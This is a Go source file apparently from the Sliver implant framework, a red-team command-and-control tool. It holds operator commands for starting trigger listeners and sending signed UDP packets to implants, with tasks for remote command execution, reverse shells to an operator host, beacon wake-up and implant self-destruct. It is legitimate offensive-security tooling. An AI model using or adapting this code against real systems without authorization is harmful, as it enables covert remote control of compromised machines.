package jobs

/*
	Sliver Implant Framework
	Copyright (C) 2026  Bishop Fox

	This program is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <https://www.gnu.org/licenses/>.
*/

import (
	"context"
	"fmt"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"

	"github.com/jedib0t/go-pretty/v6/table"
	"github.com/spf13/cobra"

	"github.com/bishopfox/sliver/client/command/settings"
	"github.com/bishopfox/sliver/client/command/triggers"
	"github.com/bishopfox/sliver/client/console"
	"github.com/bishopfox/sliver/client/secretinput"
	"github.com/bishopfox/sliver/protobuf/clientpb"
	"github.com/bishopfox/sliver/protobuf/commonpb"
)

// TriggerListenerCmd - Start a trigger (authenticated UDP) listener.
//
// Operator-facing flags:
//
//	--lhost           bind address (matches mtls/dns/etc. convention)
//	--lport           bind port
//	--secret-env      env var name on the OPERATOR machine holding the
//	                  shared HMAC secret; the bytes are sent over mTLS-
//	                  protected gRPC to the server. Avoids putting raw
//	                  secrets in argv (`ps`-visible).
//	--secret          direct secret value (visible in ps; prefer
//	                  --secret-env). If neither --secret-env nor
//	                  --secret is provided, the operator is prompted
//	                  on stdin (masked on TTY, line-read when piped).
//	--server-id       audit identifier (defaults to "sliver-trigger")
//	--task            repeatable; one of:
//	                    NAME:wake-beacon:<beacon-uuid>
//	                    NAME:stop-job:<job-name>
//	                    NAME:exec:<absolute-cmd-path>[,<arg1>,<arg2>...]
//	                    NAME:reverse-shell:<host:port>[,tls]
//	--allowed-source  repeatable; exact IP or CIDR (v4/v6)
//	--allowed-client  repeatable; client_id values to accept
//	--strict          require every accepted client_id to have a per-
//	                  client key (not yet exposed via CLI; future)
func TriggerListenerCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	lhost, _ := cmd.Flags().GetString("lhost")
	lport, _ := cmd.Flags().GetUint32("lport")
	secretEnv, _ := cmd.Flags().GetString("secret-env")
	directSecret, _ := cmd.Flags().GetString("secret")
	directSecretChanged := cmd.Flags().Changed("secret")
	serverID, _ := cmd.Flags().GetString("server-id")
	tasks, _ := cmd.Flags().GetStringArray("task")
	allowedSources, _ := cmd.Flags().GetStringArray("allowed-source")
	allowedClients, _ := cmd.Flags().GetStringArray("allowed-client")

	// Three-tier secret resolution: env-var indirection -> direct value -> stdin prompt
	secret, err := secretinput.Resolve(
		secretEnv,
		directSecret,
		directSecretChanged,
		"--secret",
		"trigger HMAC shared secret",
		func(format string, args ...any) {
			con.PrintWarnf(format, args...)
		},
	)
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	if err := secretinput.ValidateForTemplate(secret); err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	if len(tasks) == 0 {
		con.PrintErrorf("at least one --task binding is required\n")
		return
	}

	bindings, err := parseTaskFlags(tasks)
	if err != nil {
		con.PrintErrorf("invalid --task: %v\n", err)
		return
	}

	con.PrintInfof("Starting trigger listener on %s:%d ...\n", lhost, lport)
	job, err := con.Rpc.StartTriggerListener(context.Background(), &clientpb.TriggerListenerReq{
		Host:             lhost,
		Port:             lport,
		SharedSecret:     secret,
		ServerID:         serverID,
		Intents:          bindings,
		AllowedSources:   allowedSources,
		AllowedClientIDs: allowedClients,
	})
	con.Println()
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	con.PrintInfof("Successfully started trigger listener as job #%d\n", job.JobID)
	con.PrintInfof("Registered tasks:\n")
	for _, b := range bindings {
		con.Printf("  %-24s %s\n", b.Name, taskKindLabel(b))
	}
}

// TriggerTasksCmd - Print task bindings for a running trigger
// listener job.
func TriggerTasksCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	if len(args) < 1 {
		con.PrintErrorf("usage: trigger tasks <job-id>\n")
		return
	}
	jobID, err := strconv.ParseUint(args[0], 10, 32)
	if err != nil {
		con.PrintErrorf("invalid job-id %q\n", args[0])
		return
	}
	resp, err := con.Rpc.TriggerIntents(context.Background(), &clientpb.TriggerIntentsReq{JobID: uint32(jobID)})
	if err != nil {
		con.PrintErrorf("%s\n", err)
		return
	}
	if len(resp.Bindings) == 0 {
		con.PrintInfof("Job #%d has no task bindings.\n", jobID)
		return
	}

	tw := table.NewWriter()
	tw.SetStyle(settings.GetTableStyle(con))
	tw.AppendHeader(table.Row{"TASK", "KIND", "TARGET"})
	for _, b := range resp.Bindings {
		tw.AppendRow(table.Row{b.Name, taskKindName(b), taskTargetSummary(b)})
	}
	con.Println(tw.Render())
}

// TriggerDispatchCmd - Dispatch an ad-hoc task to a running trigger
// listener by job ID. The task-name must match a registered task
// binding on the listener. This enables interactive, on-the-fly
// tasking of active trigger jobs, analogous to beacon interaction.
//
// Previously named TriggerSendCmd; renamed to TriggerDispatchCmd when
// "trigger send" was reassigned to the implant-facing UDP command.
func TriggerDispatchCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	if len(args) < 2 {
		con.PrintErrorf("usage: trigger dispatch <job-id> <task-name>\n")
		return
	}
	jobID, err := strconv.ParseUint(args[0], 10, 32)
	if err != nil {
		con.PrintErrorf("invalid job-id %q\n", args[0])
		return
	}
	taskName := strings.TrimSpace(args[1])
	if taskName == "" {
		con.PrintErrorf("task-name cannot be empty\n")
		return
	}

	// First verify the task exists on this job by querying existing bindings.
	resp, err := con.Rpc.TriggerIntents(context.Background(), &clientpb.TriggerIntentsReq{JobID: uint32(jobID)})
	if err != nil {
		con.PrintErrorf("failed to query job #%d: %s\n", jobID, err)
		return
	}

	var matchedBinding *clientpb.TriggerIntentBinding
	for _, b := range resp.Bindings {
		if b.Name == taskName {
			matchedBinding = b
			break
		}
	}
	if matchedBinding == nil {
		con.PrintErrorf("no task named %q registered on job #%d\n", taskName, jobID)
		con.PrintInfof("Available tasks:\n")
		for _, b := range resp.Bindings {
			con.Printf("  %-24s %s\n", b.Name, taskKindLabel(b))
		}
		return
	}

	con.PrintInfof("Dispatching task %q on job #%d ...\n", taskName, jobID)
	con.PrintInfof("  %s\n", taskKindLabel(matchedBinding))

	_, err = con.Rpc.TriggerDispatchTask(context.Background(), &clientpb.TriggerDispatchTaskReq{
		JobID:    uint32(jobID),
		TaskName: taskName,
	})
	if err != nil {
		con.PrintErrorf("Dispatch failed: %s\n", err)
		return
	}
	con.PrintInfof("Task %q dispatched successfully on job #%d\n", taskName, jobID)
}

// TriggerSendCmd - Send a signed trigger packet (UDP) to an implant's
// triggerwake listener. The packet is constructed and sent server-side
// via the TriggerFire RPC -- everything is handled natively within
// sliver, no external tools required.
//
// Previously named TriggerFireCmd; renamed to TriggerSendCmd when
// "trigger fire" was reassigned to "trigger send".
//
// The first positional argument can be either:
//   - A target IP/hostname (backward compatible)
//   - A trigger index (integer) from the "triggers" command list
//
// When a trigger index is provided, the port, secret, and client-id
// are auto-populated from the implant's build config and stored target
// mapping. The operator only needs to supply the intent (and --payload
// for exec).
//
// Usage:
//
//	trigger send <target-ip|trigger-index> <intent> [flags]
func TriggerSendCmd(cmd *cobra.Command, con *console.SliverClient, args []string) {
	if len(args) < 2 {
		con.PrintErrorf("usage: trigger send <target-ip|trigger-index> <intent>\n")
		return
	}

	firstArg := strings.TrimSpace(args[0])
	intent := strings.TrimSpace(args[1])
	if firstArg == "" || intent == "" {
		con.PrintErrorf("target and intent are required\n")
		return
	}

	var (
		targetHost string
		port       uint32
		secret     []byte
		clientID   string
		err        error
	)

	// Detection logic: if the first arg parses as a small integer
	// (trigger index), look up the build config. Otherwise treat as IP.
	triggerIndex, parseErr := strconv.Atoi(firstArg)
	isIndex := parseErr == nil && triggerIndex > 0 && triggerIndex < 10000

	if isIndex {
		// Index-based lookup: resolve from ImplantBuilds
		targetHost, port, secret, clientID, err = resolveTriggerIndex(triggerIndex, cmd, con)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	} else {
		// Legacy IP-based path
		targetHost = firstArg
		port, _ = cmd.Flags().GetUint32("port")
		clientID, _ = cmd.Flags().GetString("client-id")

		secretEnv, _ := cmd.Flags().GetString("secret-env")
		directSecret, _ := cmd.Flags().GetString("secret")
		directSecretChanged := cmd.Flags().Changed("secret")

		secret, err = secretinput.Resolve(
			secretEnv,
			directSecret,
			directSecretChanged,
			"--secret",
			"triggerwake HMAC shared secret",
			func(format string, args ...any) {
				con.PrintWarnf(format, args...)
			},
		)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	}

	// Allow explicit flag overrides even in index mode
	if cmd.Flags().Changed("port") {
		port, _ = cmd.Flags().GetUint32("port")
	}
	if cmd.Flags().Changed("client-id") {
		clientID, _ = cmd.Flags().GetString("client-id")
	}
	if cmd.Flags().Changed("secret") || cmd.Flags().Changed("secret-env") {
		secretEnv, _ := cmd.Flags().GetString("secret-env")
		directSecret, _ := cmd.Flags().GetString("secret")
		directSecretChanged := cmd.Flags().Changed("secret")
		secret, err = secretinput.Resolve(
			secretEnv,
			directSecret,
			directSecretChanged,
			"--secret",
			"triggerwake HMAC shared secret",
			func(format string, args ...any) {
				con.PrintWarnf(format, args...)
			},
		)
		if err != nil {
			con.PrintErrorf("%s\n", err)
			return
		}
	}

	if intent == "self-destruct" {
		con.PrintWarnf("DESTRUCTIVE: this will wipe the implant binary + configured burn paths on the target.\n")
		con.PrintWarnf("Ensure you have a VM snapshot before proceeding.\n")
	}

	payload, _ := cmd.Flags().GetString("payload")

	con.PrintInfof("Sending trigger packet: target=%s:%d intent=%s client-id=%s\n",
		targetHost, port, intent, clientID)
	if payload != "" {
		con.PrintInfof("Payload: %s\n", payload)
	}

	resp, err := con.Rpc.TriggerFire(context.Background(), &clientpb.TriggerFireReq{
		TargetHost:   targetHost,
		TargetPort:   port,
		Intent:       intent,
		SharedSecret: secret,
		ClientID:     clientID,
		Payload:      payload,
	})
	if err != nil {
		con.PrintErrorf("Send failed: %s\n", err)
		return
	}

	if intent == "exec" && resp != nil {
		// Bidirectional: display the implant's response.
		con.PrintInfof("Trigger packet sent to %s:%d (intent=%s)\n", targetHost, port, intent)
		if resp.Error != "" {
			con.PrintErrorf("Implant error: %s\n", resp.Error)
		}
		if resp.Output != "" {
			con.PrintInfof("Exit code: %d\n", resp.ExitCode)
			con.PrintInfof("Output:\n")
			con.Println(resp.Output)

			// Item 5: --output flag writes exec output to file
			outputPath, _ := cmd.Flags().GetString("output")
			if outputPath != "" {
				if writeErr := os.WriteFile(outputPath, []byte(resp.Output), 0600); writeErr != nil {
					con.PrintErrorf("Failed to write output to %s: %s\n", outputPath, writeErr)
				} else {
					con.PrintInfof("Output written to %s\n", outputPath)
				}
			}
		} else if resp.Error == "" {
			con.PrintInfof("No output received (command may have produced no output)\n")
		}
	} else {
		con.PrintInfof("Trigger packet sent to %s:%d (intent=%s)\n", targetHost, port, intent)
		con.PrintInfof("Note: UDP is fire-and-forget -- delivery is not confirmed.\n")
	}
}

// resolveTriggerIndex looks up a trigger implant by its 1-based index
// in the sorted ImplantBuilds list (same order as the "triggers" command
// displays). Returns the target IP, port, secret, and client-id auto-
// populated from the build config and stored target mapping.
func resolveTriggerIndex(index int, cmd *cobra.Command, con *console.SliverClient) (string, uint32, []byte, string, error) {
	builds, err := con.Rpc.ImplantBuilds(context.Background(), &commonpb.Empty{})
	if err != nil {
		return "", 0, nil, "", fmt.Errorf("failed to fetch implant builds: %s", err)
	}

	// Build a sorted list of trigger implants (same as triggers.go)
	type entry struct {
		name   string
		config *clientpb.ImplantConfig
	}
	var triggerBuilds []entry
	for name, config := range builds.Configs {
		if config.GetIncludeTriggerWake() {
			triggerBuilds = append(triggerBuilds, entry{name, config})
		}
	}
	sort.Slice(triggerBuilds, func(i, j int) bool {
		return triggerBuilds[i].name < triggerBuilds[j].name
	})

	if len(triggerBuilds) == 0 {
		return "", 0, nil, "", fmt.Errorf("no trigger implants found -- generate one with 'generate trigger'")
	}
	if index < 1 || index > len(triggerBuilds) {
		return "", 0, nil, "", fmt.Errorf("trigger index %d out of range (have %d trigger implants)", index, len(triggerBuilds))
	}

	e := triggerBuilds[index-1]
	config := e.config

	// Extract port from TriggerWakeBindAddr (host:port)
	var port uint32
	bindAddr := config.GetTriggerWakeBindAddr()
	if bindAddr != "" {
		_, portStr, splitErr := net.SplitHostPort(bindAddr)
		if splitErr == nil {
			if p, convErr := strconv.ParseUint(portStr, 10, 32); convErr == nil {
				port = uint32(p)
			}
		}
	}
	if port == 0 {
		port = 46290 // default trigger port
	}

	// Secret from build config
	secret := config.GetTriggerWakeSecret()
	if len(secret) == 0 {
		return "", 0, nil, "", fmt.Errorf("trigger implant %q has no baked-in secret -- provide --secret or --secret-env", e.name)
	}

	// Client ID: first allowed client or default
	clientID := "sliver-operator"
	if ids := config.GetTriggerWakeAllowedClientIDs(); len(ids) > 0 {
		clientID = ids[0]
	}

	// Look up target IP from stored targets
	store, _ := triggers.LoadTargetStore()
	targetIP := store.Targets[e.name]
	if targetIP == "" {
		return "", 0, nil, "", fmt.Errorf("no target IP stored for trigger %q (index %d) -- use 'triggers target %d <ip>' first", e.name, index, index)
	}

	con.PrintInfof("Resolved trigger index %d: name=%s target=%s port=%d\n", index, e.name, targetIP, port)
	return targetIP, port, secret, clientID, nil
}

// parseTaskFlags parses --task strings into TriggerIntentBindings.
//
// Format: NAME:KIND:ARG1[,ARG2,...]
func parseTaskFlags(raw []string) ([]*clientpb.TriggerIntentBinding, error) {
	out := make([]*clientpb.TriggerIntentBinding, 0, len(raw))
	for _, r := range raw {
		parts := strings.SplitN(r, ":", 3)
		if len(parts) < 3 {
			return nil, fmt.Errorf("expected NAME:KIND:ARGS, got %q", r)
		}
		name := strings.TrimSpace(parts[0])
		kind := strings.TrimSpace(parts[1])
		argstr := strings.TrimSpace(parts[2])

		b := &clientpb.TriggerIntentBinding{Name: name}
		switch kind {
		case "wake-beacon":
			b.Config = &clientpb.TriggerIntentBinding_WakeBeacon{
				WakeBeacon: &clientpb.WakeBeaconConfig{BeaconID: argstr},
			}
		case "stop-job":
			b.Config = &clientpb.TriggerIntentBinding_StopJob{
				StopJob: &clientpb.StopJobConfig{JobName: argstr},
			}
		case "exec":
			cmdParts := strings.Split(argstr, ",")
			b.Config = &clientpb.TriggerIntentBinding_Exec{
				Exec: &clientpb.ExecConfig{
					Cmd:  strings.TrimSpace(cmdParts[0]),
					Args: trimEach(cmdParts[1:]),
				},
			}
		case "reverse-shell":
			rsParts := strings.Split(argstr, ",")
			operatorAddr := strings.TrimSpace(rsParts[0])
			useTLS := false
			for _, opt := range rsParts[1:] {
				if strings.TrimSpace(opt) == "tls" {
					useTLS = true
				}
			}
			b.Config = &clientpb.TriggerIntentBinding_ReverseShell{
				ReverseShell: &clientpb.ReverseShellConfig{
					OperatorAddr: operatorAddr,
					UseTLS:       useTLS,
				},
			}
		default:
			return nil, fmt.Errorf("unknown kind %q (want one of: wake-beacon, stop-job, exec, reverse-shell)", kind)
		}
		out = append(out, b)
	}
	return out, nil
}

func trimEach(xs []string) []string {
	out := make([]string, 0, len(xs))
	for _, x := range xs {
		t := strings.TrimSpace(x)
		if t != "" {
			out = append(out, t)
		}
	}
	return out
}

func taskKindLabel(b *clientpb.TriggerIntentBinding) string {
	return fmt.Sprintf("%s -> %s", taskKindName(b), taskTargetSummary(b))
}

func taskKindName(b *clientpb.TriggerIntentBinding) string {
	switch b.GetConfig().(type) {
	case *clientpb.TriggerIntentBinding_WakeBeacon:
		return "wake-beacon"
	case *clientpb.TriggerIntentBinding_StopJob:
		return "stop-job"
	case *clientpb.TriggerIntentBinding_Exec:
		return "exec"
	case *clientpb.TriggerIntentBinding_ReverseShell:
		return "reverse-shell"
	default:
		return "unknown"
	}
}

func taskTargetSummary(b *clientpb.TriggerIntentBinding) string {
	switch cfg := b.GetConfig().(type) {
	case *clientpb.TriggerIntentBinding_WakeBeacon:
		return fmt.Sprintf("beacon=%s", cfg.WakeBeacon.GetBeaconID())
	case *clientpb.TriggerIntentBinding_StopJob:
		return fmt.Sprintf("job=%s", cfg.StopJob.GetJobName())
	case *clientpb.TriggerIntentBinding_Exec:
		return fmt.Sprintf("cmd=%s", cfg.Exec.GetCmd())
	case *clientpb.TriggerIntentBinding_ReverseShell:
		tls := ""
		if cfg.ReverseShell.GetUseTLS() {
			tls = ", tls"
		}
		return fmt.Sprintf("%s%s", cfg.ReverseShell.GetOperatorAddr(), tls)
	default:
		return ""
	}
}
